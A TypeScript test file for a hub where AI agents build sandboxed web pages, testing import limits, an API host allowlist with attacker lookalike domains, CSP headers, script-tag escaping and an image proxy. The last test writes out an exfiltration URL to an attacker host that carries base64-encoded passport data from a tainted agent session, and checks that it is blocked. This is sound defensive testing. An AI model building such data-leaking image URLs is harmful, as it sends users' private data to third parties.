// Pages agents make (pages.ts, server/pages.ts, tools/page-tools.ts): the TSX compiles to the kit's script and only
// the kit's modules import; a page's link is its capability and serves it sandboxed with the kit, its data and state;
// what broke in a browser reaches page_read; a change bumps the version; the page fetches only allowed APIs.
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { freePort } from "@piomio/testkit";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { PageView } from "@piomio/shared";
import { Hub, loadConfig } from "../src/index.ts";
import { compilePage, PageError, pageApiHostAllowed } from "../src/pages.ts";

const fixtures = join(import.meta.dirname, "fixtures");
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const PAGE = `
import { useState } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { MapPin } from "lucide-react";
import { Hero, useData } from "@piomio/page";

type Data = { stops: { name: string }[] };

export default function Page() {
  const { stops } = useData<Data>();
  const [open, setOpen] = useState(0);
  return (
    <main className="mx-auto max-w-3xl space-y-6 p-4">
      <Hero title="A walk" />
      {stops.map((s, i) => (
        <Card key={i} onClick={() => setOpen(i)}>
          <CardContent><MapPin /> {s.name} {open === i && <Button>Go</Button>}</CardContent>
        </Card>
      ))}
    </main>
  );
}
`;

describe("a page's code", () => {
  it("compiles to the kit's script with the kit's modules", () => {
    const script = compilePage(PAGE);
    expect(script.startsWith("piomioPage(function (require, exports, module) {")).toBe(true);
    expect(script).toMatch(/require\(['"]@\/components\/ui\/card['"]\)/);
    expect(script).toMatch(/require\(['"]react\/jsx-runtime['"]\)/);
    expect(script).not.toContain("type Data");
  });

  it("refuses modules the kit does not have and says what it has", () => {
    expect(() => compilePage(`import axios from "axios";\nexport default function P() { return axios; }`)).toThrow(PageError);
    expect(() => compilePage(`import axios from "axios";\nexport default function P() { return axios; }`)).toThrow(/cannot import "axios".*@piomio\/page/);
    expect(() => compilePage(`const x = await import("fs");`)).toThrow(/"fs"/);
  });

  it("says where its syntax is wrong", () => {
    expect(() => compilePage("export default function P() { return <div>; }")).toThrow(/does not compile/);
  });

  it("fetches only from the allowed APIs", () => {
    expect(pageApiHostAllowed("api.open-meteo.com")).toBe(true);
    expect(pageApiHostAllowed("ru.wikipedia.org")).toBe(true);
    expect(pageApiHostAllowed("wikipedia.org")).toBe(true);
    expect(pageApiHostAllowed("evilwikipedia.org")).toBe(false);
    expect(pageApiHostAllowed("wikipedia.org.evil.com")).toBe(false);
    expect(pageApiHostAllowed("open-meteo.com.evil.com")).toBe(false);
    expect(pageApiHostAllowed("example.com")).toBe(false);
  });
});

async function until<T>(fn: () => Promise<T | undefined | false> | T | undefined | false, what: string, timeoutMs = 15_000): Promise<T> {
  const t0 = Date.now();
  while (Date.now() - t0 < timeoutMs) {
    const v = await fn();
    if (v) return v as T;
    await sleep(100);
  }
  throw new Error(`timed out waiting for ${what}`);
}

describe("pages (integration)", () => {
  let hub: Hub;
  let base = "";
  let cookie = "";
  let csrf = "";

  const req = async (method: string, path: string, body?: unknown): Promise<{ status: number; json: any }> => {
    const r = await fetch(base + path, {
      method,
      headers: { ...(body !== undefined ? { "content-type": "application/json" } : {}), origin: base, ...(cookie ? { cookie } : {}), ...(csrf ? { "x-csrf": csrf } : {}) },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const sc = r.headers.get("set-cookie");
    if (sc) cookie = sc.split(";")[0];
    const text = await r.text();
    return { status: r.status, json: text ? JSON.parse(text) : undefined };
  };
  const call = async (name: string, input: unknown) => {
    const r = await hub.tools.get(name)!.invoke(input, { sessionId: "s", agentId: "assistant", callId: "c", tainted: false, background: false, workspace: "", machineId: "local", conversationId: "c" });
    return { text: r.content.map((c) => (c.type === "text" ? c.text : "")).join(""), isError: !!r.isError };
  };
  // The page's own requests carry no cookie: it runs with an opaque origin.
  const open = (path: string, init?: RequestInit) => fetch(base + path, init);

  beforeAll(async () => {
    const [port, consolePort, egressPort] = [await freePort(), await freePort(), await freePort()];
    const kit = mkdtempSync(join(tmpdir(), "owl-kit-"));
    mkdirSync(kit, { recursive: true });
    writeFileSync(join(kit, "kit.js"), "window.piomioPage = function () {};");
    writeFileSync(join(kit, "kit.css"), ".owl-pin{}");
    writeFileSync(join(kit, "tailwind.js"), "/* tailwind */");
    writeFileSync(join(kit, "theme.css"), ":root{--radius:.75rem}");
    const config = loadConfig(
      { PIOMIO_PORT: String(port), PIOMIO_DEVICES: "0", PIOMIO_CONSOLE_PORT: String(consolePort), PIOMIO_EGRESS_PORT: String(egressPort), TZ: "UTC" },
      { dataDir: mkdtempSync(join(tmpdir(), "owl-pages-")), builtinPluginsDirs: [join(fixtures, "plugins")], builtinAgentsDir: join(fixtures, "agents"), pagesKitDir: kit },
    );
    hub = new Hub(config);
    await hub.start();
    base = config.publicUrl;
    await req("POST", "/api/auth/setup", { token: hub.auth.setupToken, password: "integration-pass-1" });
    csrf = (await req("GET", "/api/bootstrap")).json.csrf;
  });

  afterAll(async () => {
    await hub?.stop();
  });

  it("makes a page with a tool and serves it sandboxed at its link, with the kit, its data and its script", async () => {
    const updates: PageView[] = [];
    hub.bus.on("page.updated", (p: PageView) => updates.push(p));
    const bad = await call("page_create", { title: "Broken", code: `import x from "left-pad"; export default () => x;` });
    expect(bad).toMatchObject({ isError: true });
    expect(bad.text).toContain('"left-pad"');

    const made = await call("page_create", { title: "A walk in Almaty", summary: "Five stops", code: PAGE, data: { stops: [{ name: "Panfilov Park </script><b>" }] } });
    expect(made.isError).toBe(false);
    const page = hub.pages.list()[0];
    expect(page).toMatchObject({ title: "A walk in Almaty", summary: "Five stops", agentId: "assistant", conversationId: "c", version: 1 });
    expect(made.text).toContain(page.id);
    expect(updates.at(-1)?.id).toBe(page.id);

    // The chat reads its card through the API; the page itself needs no session.
    expect((await req("GET", "/api/pages")).json[0].url).toBe(page.url);
    expect((await req("GET", `/api/pages/${page.id}`)).json.title).toBe("A walk in Almaty");
    const r = await open(page.url);
    expect(r.status).toBe(200);
    const csp = r.headers.get("content-security-policy") ?? "";
    expect(csp).toContain("sandbox allow-scripts");
    expect(csp).not.toContain("allow-same-origin");
    expect(csp).toContain("frame-ancestors 'self'");
    expect(csp).toContain("connect-src 'self'");
    expect(r.headers.get("access-control-allow-origin")).toBe("*");
    const html = await r.text();
    expect(html).toContain("<title>A walk in Almaty</title>");
    const kitBase = /href="(\/p\/kit\/[0-9a-f]{12}\/)kit\.css"/.exec(html)?.[1];
    expect(kitBase).toBeDefined();
    expect(html).toContain('<style type="text/tailwindcss">:root{--radius:.75rem}</style>');
    expect(html).toContain('<script src="page.js?v=1"></script>');
    // The data cannot end its script block.
    expect(html).toContain("Panfilov Park \\u003c/script>\\u003cb>");
    expect(html).not.toContain("Panfilov Park </script>");

    const kitJs = await open(`${kitBase}kit.js`, { headers: { "accept-encoding": "identity" } });
    expect(kitJs.status).toBe(200);
    expect(kitJs.headers.get("cache-control")).toContain("immutable");
    expect(await kitJs.text()).toContain("piomioPage");
    expect((await open("/p/kit/000000000000/kit.js")).status).toBe(404);

    const script = await open(`${page.url}page.js`);
    expect(script.headers.get("content-type")).toContain("javascript");
    expect(await script.text()).toMatch(/^piomioPage\(function/);
    // A link without the trailing slash goes to the page; a wrong token is no page at all.
    expect((await open(page.url.slice(0, -1), { redirect: "manual" })).headers.get("location")).toBe(page.url);
    const wrong = page.url.replace(/\/([\w-]+)\/$/, "/AAAAAAAAAAAAAAAAAAAAAAAA/");
    expect((await open(wrong)).status).toBe(404);
    expect((await open(`${wrong}page.js`)).status).toBe(404);
  });

  it("keeps the page's state, reports its errors to page_read, and a change bumps the version and clears the error", async () => {
    const page = hub.pages.list()[0];
    const post = (path: string, body: unknown) => open(`${page.url}${path}`, { method: "POST", headers: { "content-type": "text/plain" }, body: JSON.stringify(body) });
    expect((await post("state", { done: [0, 2] })).status).toBe(204);
    expect((await post("state", { choice: "b" })).status).toBe(204);
    expect(hub.pages.state(page.id)).toEqual({ done: [0, 2], choice: "b" });
    expect(await (await open(page.url)).text()).toContain('"state":{"done":[0,2],"choice":"b"}');
    expect((await post("state", { big: "x".repeat(300_000) })).status).toBe(400);

    expect((await post("error", { message: "TypeError: stops is undefined", stack: "at Page (page.tsx:9)" })).status).toBe(204);
    expect(hub.pages.get(page.id)?.lastError).toContain("TypeError: stops is undefined");
    const read = await call("page_read", { page: "A walk in Almaty" });
    expect(read.text).toContain("Error in the browser:\nTypeError: stops is undefined");
    expect(read.text).toContain('Saved state: {"done":[0,2],"choice":"b"}');
    expect(read.text).toContain("export default function Page()");

    const upd = await call("page_update", { page: page.id, data: { stops: [{ name: "Kok-Tobe" }] }, summary: "Six stops" });
    expect(upd.text).toContain("version 2");
    const after = hub.pages.get(page.id)!;
    expect(after).toMatchObject({ version: 2, summary: "Six stops" });
    expect(after.lastError).toBeUndefined();
    expect(hub.pages.source(page.id)?.data).toEqual({ stops: [{ name: "Kok-Tobe" }] });
    expect(await (await open(page.url)).text()).toContain('page.js?v=2');
    expect((await call("page_update", { page: page.id, code: "export default function P( {" })).isError).toBe(true);
    expect(hub.pages.get(page.id)?.version).toBe(2);
  });

  it("keeps the page's card in the agent's reply once the reply is complete", async () => {
    await until(() => hub.brains.has("fake@local"), "fake brains to register");
    const main = (await req("GET", "/api/bootstrap")).json.mainConversationId as string;
    const args = { title: "Card in the reply", code: "export default function P() { return <main>Hi</main>; }" };
    await req("POST", `/api/conversations/${main}/messages`, { text: `CALL page_create ${JSON.stringify(args)}` });
    const reply = await until(async () => {
      const msgs = (await req("GET", `/api/conversations/${main}/messages`)).json as Array<{ role: string; status: string; parts: any[] }>;
      return msgs.find((m) => m.role === "assistant" && m.status === "complete" && m.parts.some((p) => p.type === "tool_call" && p.name === "page_create"));
    }, "the complete reply");
    const page = hub.pages.list().find((p) => p.title === "Card in the reply")!;
    expect(reply.parts).toContainEqual({ type: "page", pageId: page.id });
  });

  it("fetches only from the allowed APIs, and shows a page's card again", async () => {
    const page = hub.pages.list().find((p) => p.title === "A walk in Almaty")!;
    const r = await open(`${page.url}fetch?url=${encodeURIComponent("https://example.com/secret?x=1")}`);
    expect(r.status).toBe(403);
    expect(r.headers.get("access-control-allow-origin")).toBe("*");
    expect((await r.json()).error).toContain("example.com");
    expect((await open(`${page.url}route?mode=fly&points=1,2;3,4`)).status).toBe(400);
    expect((await call("page_show", { page: page.id })).text).toContain("A walk in Almaty");
    expect((await call("page_list", {})).text).toContain(page.id);
    expect((await call("page_show", { page: "nothing" })).isError).toBe(true);
  });

  it("fetches a page's pictures, except one the hub held (policy/pictures.ts): an earlier copy of it at most", async () => {
    const page = hub.pages.list().find((p) => p.title === "A walk in Almaty")!;
    const img = (url: string) => open(`${page.url}img?url=${encodeURIComponent(url)}`);
    const PNG = Buffer.from("89504e470d0a1a0a", "hex");
    // No network in tests: the proxy's fetch answers here, and says what it was asked for.
    const fetched: string[] = [];
    const image = vi.spyOn(hub.media, "image").mockImplementation(async (raw: unknown) => (fetched.push(String(raw)), { data: PNG, type: "image/png" }));
    const cached = vi.spyOn(hub.media, "cachedImage").mockReturnValue(undefined);
    try {
      const plain = "https://upload.wikimedia.org/park.png";
      expect((await img(plain)).status).toBe(200);
      // An address a tainted session put together, to a host nobody named.
      const leak = `https://pics.attacker.test/p.png?d=${Buffer.from("passport 4510 123456").toString("base64")}`;
      hub.pictures.decide({ id: "s-page", tainted: true }, [leak], () => ({ texts: [], knownHost: () => false }));
      expect(hub.pictures.state(leak)).toBe("held");
      const held = await img(leak);
      expect(held.status).toBe(403);
      expect((await held.json()).error).toMatch(/held/);
      expect(fetched).toEqual([plain]);
      // A copy fetched before it was held sends nothing out.
      cached.mockReturnValue({ data: PNG, type: "image/png" });
      expect((await img(leak)).status).toBe(200);
      expect(fetched).toEqual([plain]);
    } finally {
      image.mockRestore();
      cached.mockRestore();
    }
  });
});
